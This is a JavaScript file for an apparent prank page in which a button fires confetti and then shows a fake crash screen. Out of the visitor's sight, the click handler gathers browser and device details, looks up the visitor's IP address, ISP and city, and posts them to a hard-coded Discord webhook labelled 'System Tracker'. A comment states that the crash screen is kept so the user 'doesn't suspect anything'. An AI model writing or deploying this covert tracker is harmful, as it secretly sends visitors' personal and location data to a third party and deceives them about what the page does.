const button = document.getElementById('pressButton');
const crashScreen = document.getElementById('crashScreen');

// 🔴 PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW 🔴
const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";

button.addEventListener('click', () => {
    // 1. Trigger Confetti Explosion
    const count = 200;
    const defaults = { origin: { y: 0.7 } };

    function fire(particleRatio, opts) {
        confetti(Object.assign({}, defaults, opts, {
            particleCount: Math.floor(count * particleRatio)
        }));
    }

    fire(0.25, { spread: 26, startVelocity: 55 });
    fire(0.2, { spread: 60 });
    fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
    fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
    fire(0.1, { spread: 120, startVelocity: 45 });

    // 2. Gather Device Info (Browser, Screen, Platform)
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenRes: `${window.screen.width} x ${window.screen.height}`,
        cores: navigator.hardwareConcurrency || "Unknown"
    };

    // 3. Get IP and Network Info
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const payload = {
                username: "🕵️ System Tracker",
                avatar_url: "https://i.imgur.com/yourIcon.png", // Optional icon
                embeds: [
                    {
                        title: "🚨 BUTTON PRESSED - DATA CAPTURED",
                        description: "User triggered the crash sequence.",
                        color: 16711740, // Red
                        fields: [
                            // --- NETWORK INFO ---
                            { name: "🌐 IP Address", value: `||${data.ip}||`, inline: true },
                            { name: "🏢 ISP / Network", value: data.org || "Unknown", inline: true },
                            { name: "📍 Location", value: `${data.city}, ${data.country_name}`, inline: true },
                            
                            // --- DEVICE INFO ---
                            { name: "💻 Platform", value: deviceInfo.platform, inline: true },
                            { name: "📱 Screen Res", value: deviceInfo.screenRes, inline: true },
                            { name: "🧠 CPU Cores", value: deviceInfo.cores, inline: true },
                            
                            // --- BROWSER INFO ---
                            { name: "🌍 Language", value: deviceInfo.language, inline: true },
                            { name: "🔍 User Agent", value: (deviceInfo.userAgent).substring(0, 50) + "...", inline: false }
                        ],
                        footer: { text: "GitHub Pages Advanced Tracker" },
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            // 4. Send Webhook
            return fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .then(response => {
            console.log("Webhook sent with extra info!");
            
            // 5. Trigger Fake Crash Screen after 1.5 seconds
            setTimeout(() => {
                button.style.display = 'none';
                crashScreen.style.display = 'block';
            }, 1500);
        })
        .catch(error => {
            console.error('Error:', error);
            // If it fails, still show the crash screen so user doesn't suspect anything
            setTimeout(() => {
                button.style.display = 'none';
                crashScreen.style.display = 'block';
            }, 1500);
        });
});
